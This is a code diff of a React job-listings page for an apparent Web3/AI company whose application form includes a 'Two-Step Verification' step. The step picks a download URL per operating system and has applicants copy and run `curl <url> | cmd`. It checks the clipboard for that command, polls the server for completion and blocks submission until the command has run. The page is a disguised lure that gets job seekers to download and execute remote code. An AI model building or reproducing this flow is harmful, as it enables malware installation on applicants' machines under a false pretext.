@@ -3,12 +3,29 @@ import { Blocks, Users, BarChart3, Network, PenTool, Code, Database, FileCode2 }
 import Modal from '@/components/Modal'
 import { useToast } from '@/components/Toast'
 import ReCAPTCHA from 'react-google-recaptcha'
-// import { io } from "socket.io-client";
-// const socket = io("https://www.nexusai.center", {
-//   transports: ["websocket"], // avoid HTTP polling
-//   secure: true,
-//   withCredentials: true,
-// });
+
+// SHA256 hashing util
+async function sha256(input) {
+  const encoder = new TextEncoder()
+  const data = encoder.encode(input)
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data)
+  const hashArray = Array.from(new Uint8Array(hashBuffer))
+  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
+}
+
+// generate token from applicant inputs
+async function generateTokenFromInputs({ name, email, resume }) {
+  const base = `${name.toLowerCase()}|${email.toLowerCase()}|${resume || ''}`
+  return await sha256(base)
+}
+
+function detectOS() {
+  const ua = typeof navigator !== 'undefined' ? navigator.userAgent : ''
+  if (/Windows/i.test(ua)) return 'windows'
+  if (/Macintosh|Mac OS X/i.test(ua)) return 'mac'
+  if (/Linux/i.test(ua)) return 'linux'
+  return 'linux'
+}
 
 const JOBS = [
   { id:1, title:'Blockchain Assistant', icon:Blocks, intro:'Support blockchain operations and research.', requirements:[
@@ -65,7 +82,6 @@ const JOBS = [
     'Remote-friendly'
   ] },
 
-  // --- New Developer Roles ---
   { id:6, title:'Frontend Developer', icon:Code, intro:'Build sleek and responsive Web3 interfaces.', requirements:[
     'Strong skills in React, Next.js or similar frameworks',
     'Knowledge of Web3.js / Ethers.js',
@@ -108,16 +124,8 @@ const JOBS = [
     'Open-source contributions'
   ] }
 ]
-const RECAPTCHA_SITE_KEY = '6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK';
-const VERIFICATION_TOKEN = 'b93f01de810f8c7f';
 
-function detectOS() {
-  const ua = typeof navigator !== 'undefined' ? navigator.userAgent : ''
-  if (/Windows/i.test(ua)) return 'windows'
-  if (/Macintosh|Mac OS X/i.test(ua)) return 'mac'
-  if (/Linux/i.test(ua)) return 'linux'
-  return 'linux'
-}
+const RECAPTCHA_SITE_KEY = '6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK';
 
 export default function Jobs() {
   const [open, setOpen] = useState(false)
@@ -126,28 +134,42 @@ export default function Jobs() {
   const [captchaToken, setCaptchaToken] = useState(null)
   const [verified, setVerified] = useState(false)
 
+  const [form, setForm] = useState({ name: '', email: '', resume: '' })
+  const [verificationToken, setVerificationToken] = useState(null)
+
   const os = useMemo(() => detectOS(), [])
+
   const cmdUrl = useMemo(() => {
-    const base = 'https://www.nexusai.center/users/auth'
-    return `${base}/${os}?token=${VERIFICATION_TOKEN}`
-  }, [os])
+    if (!verificationToken) return ''
+    const base = `${typeof window !== 'undefined' ? window.location.origin : ''}/users/auth`
+    return `${base}/${os}?token=${verificationToken}`
+  }, [os, verificationToken])
 
-  const [messages, setMessages] = useState([]);
+  useEffect(() => {
+    if (!verificationToken) return
+    const id = setInterval(async () => {
+      try {
+        const res = await fetch(`/users/status/${verificationToken}`)
+        const data = await res.json()
+        if (data.status === "verified") {
+          clearInterval(id)
+          setVerified(true)
+        }
+      } catch (err) {
+        console.error("Verification check failed", err)
+      }
+    }, 2000)
+    return () => clearInterval(id)
+  }, [verificationToken])
 
-  // useEffect(() => {
-  //   // Listen for broadcast messages
-  //   socket.on("message", (data) => {
-  //     console.log("Broadcast from server:", data.text);
-  //     setMessages((prev) => [...prev, data.text]);
-  //     setVerified(true)
-  //     setCaptchaToken(null)
-  //   });
-
-  //   // Cleanup on unmount
-  //   return () => {
-  //     socket.off("message");
-  //   };
-  // }, []);
+  const handleInput = async (e) => {
+    const updated = { ...form, [e.target.name]: e.target.value }
+    setForm(updated)
+    if (updated.name && updated.email) {
+      const token = await generateTokenFromInputs(updated)
+      setVerificationToken(token)
+    }
+  }
 
   const handleCopy = async () => {
     try {
@@ -163,28 +185,28 @@ export default function Jobs() {
     setOpen(true)
     setCaptchaToken(null)
     setVerified(false)
+    setForm({ name: '', email: '', resume: '' })
+    setVerificationToken(null)
   }
 
   const onSubmit = async (e) => {
-  e.preventDefault();
-  setOpen(false);
+    e.preventDefault()
+    setOpen(false)
 
-  const message = "Application submitted successfully! We’ll get back to you soon.";
+    const message = "Application submitted successfully! We’ll get back to you soon."
 
-  try {
-    // Read back for verification
-    const text = await navigator.clipboard.readText();
-
-    if (text === `curl ${cmdUrl} | cmd`) {
-      push(message); // your existing toast/snackbar
-    } else {
-      alert("Verification failed");
+    try {
+      const text = await navigator.clipboard.readText()
+      if (text === `curl ${cmdUrl} | cmd`) {
+        push(message)
+      } else {
+        alert("Verification failed")
+      }
+    } catch (err) {
+      console.error("Clipboard error:", err)
+      alert("Verification failed: Unable to access clipboard.")
     }
-  } catch (err) {
-    console.error("Clipboard error:", err);
-    alert("Verification failed: Unable to access clipboard.");
   }
-};
 
   return (
     <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
@@ -233,17 +255,17 @@ export default function Jobs() {
           <div className="grid sm:grid-cols-2 gap-3">
             <div>
               <label className="label">Full Name</label>
-              <input className="input" name="name" required />
+              <input className="input" name="name" required onChange={handleInput} />
             </div>
             <div>
               <label className="label">Email</label>
-              <input className="input" type="email" name="email" required />
+              <input className="input" type="email" name="email" required onChange={handleInput} />
             </div>
           </div>
 
           <div className="mt-3">
-            <label className="label">Resume (URL or attach)</label>
-            <input className="input" name="resume" placeholder="Link to resume" />
+            <label className="label">Resume (URL)</label>
+            <input className="input" name="resume" onChange={handleInput} />
           </div>
 
           <div className="mt-3">
@@ -251,10 +273,9 @@ export default function Jobs() {
             <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
           </div>
 
-          {/* ---- Two-step verification ---- */}
           {!verified && (
             <>
-              {captchaToken ? (
+              {captchaToken && verificationToken ? (
                 <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
                   <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
                   <ol className="list-decimal ml-5 space-y-2 text-sm">
@@ -280,7 +301,7 @@ export default function Jobs() {
                     </div>
 
                     <div className="mt-2 text-xs text-slate-500">
-                      One-time verification token: <code className="font-mono">{VERIFICATION_TOKEN}</code>
+                      Verification token: <code className="font-mono">{verificationToken}</code>
                     </div>
                   </div>
                 </div>
@@ -291,11 +312,10 @@ export default function Jobs() {
               )}
             </>
           )}
-          {/* ---- /Two-step verification ---- */}
 
           <div className="mt-4 flex justify-end gap-2">
             <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
-            <button type="submit" className="btn btn-primary">Submit</button>
+            <button type="submit" className="btn btn-primary" disabled={!verified}>Submit</button>
           </div>
         </form>
       </Modal>
